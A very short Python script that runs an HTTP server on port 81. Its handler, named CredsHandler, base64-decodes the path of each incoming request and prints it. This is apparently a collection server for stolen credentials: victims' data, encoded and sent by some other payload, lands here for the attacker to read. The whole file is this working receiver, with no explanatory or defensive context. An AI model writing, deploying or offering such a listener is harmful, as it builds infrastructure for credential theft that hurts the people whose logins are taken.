import http.server
import socketserver
import base64


class CredsHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(s):
        print(base64.b64decode(s.path[1:]))

if __name__ == '__main__':
    cred_server = socketserver.TCPServer(('', 81), CredsHandler)
    cred_server.serve_forever()

